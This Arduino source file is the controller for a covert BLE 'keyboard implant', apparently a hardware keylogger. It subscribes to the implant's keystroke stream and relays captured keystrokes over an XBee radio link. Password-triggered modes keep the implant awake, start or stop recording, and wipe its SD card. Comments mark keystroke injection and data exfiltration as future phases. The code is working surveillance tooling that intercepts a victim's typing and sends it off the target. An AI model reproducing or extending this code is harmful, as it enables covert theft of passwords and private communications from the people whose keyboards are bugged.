/*
  -  Connect to Nano IoT Keyboard implant and relay BLE keystrokes over Serial 1 to Xbee. (10/9/20, Jonathan Fischer)
  -  Scan for Targets based on Service UUID, create list, scan for strongest target signal and connect
  - Special note: if connection to a parameter is needed, run it in a loop until the characteristic is found
  - Updated to include mode selection and password control from zigbee and to BLEp
  -  Need to implement better passwords for modes other than keystrokeSniffing and keystroke tx disable
*/

#include <ArduinoBLE.h>
int32_t data;
char dataRx[20];
char emptydata[20];
String parsedData[8];
String message = "";
bool lockout = false;
String data_rx = "";
String misc_rx = "";
byte mode = 0;

void setup() {
  Serial.begin(9600);
  Serial1.begin(9600);
  while (!Serial);

  // begin initialization
  if (!BLE.begin()) {
    Serial.println("starting BLE failed!");

    while (1);
  }

  Serial.println("BLE Central - Relay test");
  Serial.println("Make sure to turn on the device.");

  // start scanning for peripheral address passed from Xbee
  //BLE.scan();
  BLE.scanForAddress("24:0a:c4:c5:05:36");
}

void loop() {
  if (Serial1.available()) {     // If anything comes in Serial1 (pins 0 & 1)
    data_rx = Serial1.read(); //may need to use .readString()
  }
  
  //check for mode command
  if (data_rx == "ce8hovfvemu@ap*B+H3s"){ //keystroke tx enable
    Serial.println("Keystroke Tx enable password received");
    mode = 1;
  }
  else if (data_rx == "ce8hovevemu@ap*B+H3s"){ //keystroke tx disable
    Serial.println("Keystroke Tx Disable received");
    mode = 2;
  }
  else if (data_rx == "jorLwabocUqeq6bRof$2"){ //enable insomnia
    Serial.println("Enable Insomnia password received");
    mode = 3;
  }
  else if (data_rx == "jorLwbbocUqeq6bRof$2"){ //disable insomnia
    Serial.println("Disable insomnia password received");
    mode = 4;
  }
  else if (data_rx == "GatIQEMaNodE5L#p$T?l"){ //enable recording
    Serial.println("Enable recording password received");
    mode = 5;
  }
  else if (data_rx == "GatlQEMaNodE5L#p$T?l"){ //disable recording
    Serial.println("Disable recording password received");
    mode = 6;
  }
  else if (data_rx == "4+aJu2+6ATRES+ef_OtR"){ //wipe sd card
    Serial.println("Wipe SD card password received");
    mode = 7;
  }
  else if (data_rx == "c01h2*+dIp?W3lpez*T="){ //keystroke injection
    Serial.println("Keystroke injection password received");
    Serial.println("Attack Scripts and Keystroke Injection will be implemented in Phase2");
    //mode = 8;
  }
  else if (data_rx == "s$en*zET0aYozE!l-Tu0"){ //data exfil
    Serial.println("Data exfil password received");
    Serial.println("Data Exfil will be implemented in Phase3");
    //mode = 9;
  }
  else {
    Serial.println("Misc data received: ");
    Serial.println(data);
    misc_rx = data;
    mode = 0;
  }
  
  // check if a peripheral has been discovered
  BLEDevice peripheral = BLE.available();
  if (peripheral) {
    // discovered a peripheral, print out address, local name, and advertised service
    Serial.print("Found ");
    Serial.print(peripheral.address());
    Serial.print(" '");
    Serial.print(peripheral.localName());
    Serial.print("' ");
    Serial.print(peripheral.advertisedServiceUuid());
    Serial.println();

    // Check if the peripheral is our board, the local name will be:
    // "BLE Keyboard"
    if (peripheral.localName() == "BLE Keyboard") {
      Serial.print("Found target: ");
      Serial.println(peripheral.address());
      peripheral.connect();
      BLE.stopScan();
      if (mode == 1){
        monitorKeystrokes(peripheral);
        mode = 0;
      }
      else if (mode == 2) { //check for sending disable tx password
        disableKeystrokes(peripheral);
        mode = 0;
      }
      else if (mode == 3) {
        setInsomnia(peripheral);
        mode = 0;
      }
      else if (mode == 4){
        allowSleep(peripheral);
        mode = 0;
      }  
      else if (mode == 5){
        setRecordKeys(peripheral);
        mode = 0;
      }  
      else if (mode == 6){
        stopRecordKeys(peripheral);
        mode = 0;
      } 
      else if (mode == 7){
        setWipeCardP(peripheral);
        mode = 0;
      } 
      else if (mode == 8){
        Serial.println("This will eventually trigger the attack script function");
        mode = 0;
      }  
      else if (mode == 9){
        Serial.println("This will eventually trigger the data exfil function");
        mode = 0;
      }  
        
        setRecordKeys(peripheral);
        delay(1000);
        monitorKeystrokes(peripheral);
        
        // peripheral disconnected, start scanning again
        BLE.scan();
    }
  }
}

void monitorKeystrokes(BLEDevice p) {
  // connect to the peripheral
  Serial.println("Connecting ...");
  if (p.connect()) {
    Serial.println("Connected");
  } else {
    Serial.println("Failed to connect!");
    return;
  }
  p.discoverService("C103");
  // send the password over
  BLECharacteristic passCharacteristic = p.characteristic("0110");
  
  if (!passCharacteristic) {
    Serial.println("Peripheral does not have Password characteristic!");
    p.disconnect();
    return;
  } else if (!passCharacteristic.canWrite()) {
    Serial.println("Peripheral does not have a writable Password characteristic!");
    p.disconnect();
    return;
  }
  else {
    Serial.println("Writing password...");
    //Serial.println((char*)"8ajI=6otrlb@l?lp");
    passCharacteristic.writeValue((char*)"8ajI=6otrlb@l?lp");
    //passCharacteristic.writeValue((char*)"pass");
  }
  

  // retrieve the keystroke characteristic
  BLECharacteristic keystrokeCharacteristic = p.characteristic("0111");

  // subscribe to the keystroke characteristic
  Serial.println("Subscribing keystroke characteristic ...");
  if (!keystrokeCharacteristic) {
    Serial.println("no keystroke characteristic found!");
    p.disconnect();
    return;
  } else if (!keystrokeCharacteristic.canSubscribe()) {
    Serial.println("keystroke characterisitc is not subscribable!");
    p.disconnect();
    return;
  } else if (!keystrokeCharacteristic.subscribe()) {
    Serial.println("subscription failed!");
    p.disconnect();
    return;
  } else {
    Serial.println("Subscribed");
  }

  while (p.connected()) {
    // while the peripheral is connected

    // check if the value of the simple key characteristic has been updated
    if (keystrokeCharacteristic.valueUpdated()) {
      // yes, get the value, characteristic is 1 byte so use byte value
      
      keystrokeCharacteristic.readValue(dataRx, 20);
      Serial.print("dataRx: ");
      Serial.println(dataRx);
      Serial1.write(dataRx);
    }
  }
  Serial.println("Device disconnected!");
}

void disableKeystrokes(BLEDevice p){
  if (p) {
    p.connect();
    p.discoverService("C103");

    // send the password over
    BLECharacteristic passCharacteristic = p.characteristic("0110");
  
    if (!passCharacteristic) {
      Serial.println("Peripheral does not have Password characteristic!");
      p.disconnect();
      return;
    } else if (!passCharacteristic.canWrite()) {
      Serial.println("Peripheral does not have a writable Password characteristic!");
      p.disconnect();
      return;
    }
    else {
      Serial.println("Writing password...");
      passCharacteristic.writeValue((char*)"8ajI=60trlb@l?lp");
      //passCharacteristic.writeValue((char*)"pass"); //used for manual testing over BLE
    }
  }
  p.disconnect();
}

void setInsomnia(BLEDevice p){
  if (p) {
    p.connect();
    p.discoverService("C103");

    // send the password over
    BLECharacteristic insomniaCharacteristic = p.characteristic("0101");

    // subscribe to the insomnia characteristic
    Serial.println("Finding insomnia characteristic ...");
    if (!insomniaCharacteristic) {
      Serial.println("no insomnia characteristic found!");
      p.disconnect();
      return;
    } else {
      Serial.println("Insomnia characteristic found!");
      Serial.println("Writing insomnia activation password");
      insomniaCharacteristic.writeValue((char*)"Caffeine");
    }
  }
  p.disconnect();
}

void allowSleep(BLEDevice p){
  if (p) {
    p.connect();
    p.discoverService("C103");

    // send the password over
    BLECharacteristic insomniaCharacteristic = p.characteristic("0101");

    // subscribe to the insomnia characteristic
    Serial.println("Finding insomnia characteristic ...");
    if (!insomniaCharacteristic) {
      Serial.println("no insomnia characteristic found!");
      p.disconnect();
      return;
    } else {
      Serial.println("Insomnia characteristic found!");
      Serial.println("Writing insomnia deactivation password");
      insomniaCharacteristic.writeValue((char*)"Snooze");
    }
  }
  p.disconnect();
}

void setWipeCardP(BLEDevice p){
  if (p) {
    p.connect();
    p.discoverService("C104");

    // send the password over
    BLECharacteristic wipeCharacteristic = p.characteristic("0210");

    // subscribe to the insomnia characteristic
    Serial.println("Finding Wipe SD Card characteristic ...");
    if (!wipeCharacteristic) {
      Serial.println("no Wipe SD Card characteristic found!");
      p.disconnect();
      return;
    } else {
      Serial.println("Wipe SD Card characteristic found!");
      Serial.println("Writing Wipe SD Card activation password");
      wipeCharacteristic.writeValue((char*)"wipe");
    }
  }
  p.disconnect();
}

void setRecordKeys(BLEDevice p){
  if (p) {
    p.connect();
    p.discoverService("C104");

    // send the password over
    BLECharacteristic recordCharacteristic = p.characteristic("0210");

    // subscribe to the insomnia characteristic
    Serial.println("Finding Record Keys characteristic ...");
    if (!recordCharacteristic) {
      Serial.println("no Record Keys characteristic found!");
      p.disconnect();
      return;
    } else {
      Serial.println("Record keys characteristic found!");
      Serial.println("Writing Record activation password");
      recordCharacteristic.writeValue((char*)"Record");
    }
  }
  p.disconnect();
}

void stopRecordKeys(BLEDevice p){
  if (p) {
    p.connect();
    p.discoverService("C104");

    // send the password over
    BLECharacteristic recordCharacteristic = p.characteristic("0210");

    // subscribe to the insomnia characteristic
    Serial.println("Finding Record Keys characteristic ...");
    if (!recordCharacteristic) {
      Serial.println("no Record Keys characteristic found!");
      p.disconnect();
      return;
    } else {
      Serial.println("Record keys characteristic found!");
      Serial.println("Writing Record deactivation password");
      recordCharacteristic.writeValue((char*)"Stop");
    }
  }
  p.disconnect();
}
